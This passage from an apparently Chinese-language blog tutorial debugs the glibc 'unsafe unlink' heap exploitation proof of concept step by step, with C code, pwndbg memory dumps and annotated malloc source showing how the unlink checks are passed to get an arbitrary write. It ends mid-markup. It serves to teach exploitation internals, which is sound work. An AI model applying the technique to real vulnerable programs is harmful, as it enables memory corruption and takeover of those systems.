class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-调试"><a href="#POC-调试" class="headerlink" title="POC 调试"></a>POC 调试</h2><p>在 POC 的开头我们首先申请了 mchunk_size 为 0x431 的堆块，这样申请的原因是防止在后续 free 的过程中进入让堆块进入到 tcachebin 中给自己造成一些不必要的麻烦：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#printf</span></span><br><span class="line"><span class="comment">//The global chunk0_ptr is at 0x555555756020, pointing to 0x555555757260</span></span><br><span class="line"><span class="comment">//The victim chunk we are going to corrupt is at 0x555555757690</span></span><br><span class="line"><span class="comment">//全局变量chunk0_ptr在程序的data段，这个指针指向堆区中所申请的堆块</span></span><br><span class="line"><span class="comment">//现在将申请到的chunk1_ptr指向的堆块当作victim，我们让他在后续的过程中出现异常</span></span><br><span class="line"><span class="comment">//chunk0_ptr在程序的data段，chunk1_ptr在stack上</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk0_ptr</span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x0000555555757260</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk1_ptr</span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000555555757690</span><span class="number">0x0000555555554750</span></span><br><span class="line">    #与POC无关</span><br><span class="line">......</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk0</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk1</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020551</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在 chunk0 处于 malloc 状态，正常情况下我们可以修改其 user_data：</p><blockquote><p>注意：这里使用 fd_nextsize 和 bk_nextsize 来表示的是修改的位置，本步和后续步骤与 fd_nextsize 和 bk_nextsize 这两个堆块指针均无关。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//We create a fake chunk inside chunk0.</span></span><br><span class="line"><span class="comment">//We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span></span><br><span class="line"><span class="comment">//We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span></span><br><span class="line"><span class="comment">//With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span></span><br><span class="line"><span class="comment">//Fake chunk fd: 0x555555756008</span></span><br><span class="line"><span class="comment">//Fake chunk bk: 0x555555756010</span></span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk0_ptr</span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x0000555555757260</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk1_ptr</span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000555555757690</span><span class="number">0x0000555555554750</span></span><br><span class="line">    #与POC无关</span><br><span class="line">......</span><br><span class="line">pwndbg&gt;</span><br><span class="line"><span class="comment">//未发生变化</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk0</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000555555756008</span><span class="number">0x0000555555756010</span></span><br><span class="line">    #fake_chunk_fd#fake_chunk_bk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk1</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020551</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在我们通过堆溢出漏洞修改 chunk1 堆块的 mchunk_prev_size 和 mchunk_size：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pwndbg&gt; p/x chunk1_ptr - header_size</span></span><br><span class="line"><span class="comment">//$1 = 0x555555757680</span></span><br><span class="line"><span class="comment">//pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk0_ptr</span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x0000555555757260</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk1_ptr</span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000555555757690</span><span class="number">0x0000555555757680</span></span><br><span class="line">    #&amp;chunk1_hdr==<span class="number">0x555555757680</span></span><br><span class="line">                     #<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">......</span><br><span class="line">pwndbg&gt;</span><br><span class="line"><span class="comment">//未发生变化</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk0</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000555555756008</span><span class="number">0x0000555555756010</span></span><br><span class="line">    #fake_chunk_fd#fake_chunk_bk</span><br><span class="line">......</span><br><span class="line"><span class="comment">//chunk1_hdr-&gt;:0x00000000000004200x0000000000000430 #chunk1</span></span><br><span class="line">  #chunk1_hdr[<span class="number">0</span>] = malloc_size  #chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020551</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>下面是 POC 的关键步骤：unlink，这里我们要释放掉 chunk1，这里我们选择引入 malloc 源码进行调试，来到_int_free 函数中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620651239934-48e67770-e42f-40bc-9f58-79473ba84bb1.png#height=1080&id=ue7b86100&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-10%2020.53.51.png&originHeight=1080&originWidth=1920&originalType=binary&size=325811&status=done&style=none&width=1920" alt="截屏2021-05-10 20.53.51.png">一直单步到“向后合并”，看一下这里的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span> <span class="comment">//向后合并</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//prev_inuse(p)==0</span></span><br><span class="line">    <span class="comment">//进入if语句</span></span><br><span class="line">  prevsize = prev_size (p); <span class="comment">//prevsize==mchunk_prev_size==0x420</span></span><br><span class="line">  size += prevsize; <span class="comment">//size==size+prevsize==0x420+0x430==0x850</span></span><br><span class="line">    <span class="comment">//p==0x555555757680</span></span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="comment">//p==0x555555757680-0x420==0x555555757260</span></span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>向前合并向后合并的概念参见：</p></blockquote><hr><blockquote><p>以下内容是文章完成之后补充的，第一次阅读时可以现将这部分跳过，等阅读完文章之后再来看这些内容</p></blockquote><p>Q：为什么要让 prevsize==0x420 而不是 0x430？<br>这里应该考虑了在之后 top_chunk 向前吞并后，我们可以通过 chunk0 控制 top_chunk 的 size 从而使用 house of force，另外避免在 unlink 的过程中造成段错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//prev_inuse(p)==0</span></span><br><span class="line">        <span class="comment">//进入if</span></span><br><span class="line">      prevsize = prev_size (p); <span class="comment">//prevsize==0x430</span></span><br><span class="line">      size += prevsize; <span class="comment">//size==size+prevsize==0x430+0x430==0x860</span></span><br><span class="line">        <span class="comment">//这里代码没有问题，但是prevsize会触发之后的段错误</span></span><br><span class="line">        <span class="comment">//p==0x555555757680</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        <span class="comment">//p==0x555555757680-0x860==0x555555756e20（WARNING：这个地址不在堆区中）</span></span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#pwndbg&gt; x/16gx 0x555555756e20-0x10</span></span><br><span class="line">#<span class="number">0x555555756e10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">#<span class="number">0x555555756e20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> （P）</span><br><span class="line">#<span class="number">0x555555756e30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">#<span class="number">0x555555756e40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">#<span class="number">0x555555756e50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">#<span class="number">0x555555756e60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">#<span class="number">0x555555756e70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">#<span class="number">0x555555756e80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="meta">#pwndbg&gt;</span></span><br><span class="line">----------------------------------------------------------</span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))   【检查<span class="number">1</span>】</span><br><span class="line">    <span class="comment">//chunksize(P)==0x0;</span></span><br><span class="line">        <span class="comment">//next_chunk(P)==0x555555756e10+0x0==0x555555756e10</span></span><br><span class="line">        <span class="comment">//prev_size (next_chunk(P))==0x0</span></span><br><span class="line">        <span class="comment">//因此可以通过第一个检查</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;<span class="comment">//FD==NULL</span></span><br><span class="line">    BK = P-&gt;bk;<span class="comment">//BK==NULL</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))【检查<span class="number">2</span>】</span><br><span class="line">    <span class="comment">//FD-&gt;bk==NULL-&gt;bk会造成内存访问异常导致段错误</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//省略有关于largebin的代码......</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk0</span><br><span class="line"><span class="meta">#p-----------&gt;:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000555555756008</span><span class="number">0x0000555555756010</span></span><br><span class="line">    #fake_chunk_fd#fake_chunk_bk</span><br><span class="line">......</span><br><span class="line"><span class="comment">//chunk1_hdr-&gt;:0x00000000000004300x0000000000000430 #chunk1</span></span><br><span class="line">                #原来这里是<span class="number">0x420</span></span><br><span class="line">  #chunk1_hdr[<span class="number">0</span>] = malloc_size  #chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020551</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这种大小设置太妙了，但是只针对 glibc 2.29 版本以下有效：<br>另外这里我们在多提几句，poison null byte 和本文的 unsafe unlink 都利用了堆块向后合并没有检查的问题：都没有检查 chunksize(p)与 prevsize 是否相等：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620700969914-52498156-dbc9-4230-a606-9a6221be560d.png#clientId=udbb836f4-c399-4&from=drop&id=qSoxz&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-11%2010.42.45.png&originHeight=872&originWidth=1919&originalType=binary&size=263069&status=done&style=none&taskId=u7b94596b-8967-4823-be12-1e8cefb90bd" alt="截屏2021-05-11 10.42.45.png"><br>额，在 unsafe unlink 中因为 chunk0 是处于 malloc 状态的，我们直接修改其对应地址为 0x420 就行了，23333。<br>poison null byte 不太好绕过这个检查，碰见再说吧。</p><hr><p>回到正题：<br>这里由于 chunk1 的 PREV_INUSE 为 0，导致在释放 chunk1 时误认为前面的 chunk0 也处于释放状态，这时会根据 chunk1 的 mchunk_prev_size 标志位进行向后合并。在 unlink 之前的内存如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk0</span><br><span class="line"><span 